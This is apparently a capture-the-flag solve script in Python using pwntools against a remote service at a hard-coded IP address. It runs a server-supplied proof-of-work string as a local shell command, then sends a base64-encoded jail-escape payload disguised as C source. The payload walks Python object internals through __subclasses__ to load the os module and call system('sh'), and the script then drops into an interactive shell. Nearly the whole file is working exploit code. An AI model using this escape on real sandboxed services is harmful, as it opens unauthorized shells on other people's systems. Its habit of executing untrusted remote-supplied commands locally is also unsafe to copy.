from pwn import *
from base64 import b64encode
from subprocess import Popen

p = remote('193.148.168.30', 6673)

p.recvuntil(b"proof of work:\n")
source = p.recvline().strip()

print("Going to execute: ", source)
input("Press enter to continue...")
output = Popen(source, shell=True, stdout=PIPE).communicate()[0].decode().strip()

p.sendlineafter(b"solution: ", output)

inp = """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <bool.h>
#define NULL 0
#define breakpoint extern main
a = [];
void = a.__class__
bool = void.__base__
char = bool.__subclasses__()
int = char[120];
os = "os";
c_posix_t = int.load_module(os);
c_posix_t.system("sh"); 
""".strip()


p.sendlineafter(b">>> ", b64encode(inp.encode()))

p.interactive()
# should have shell now
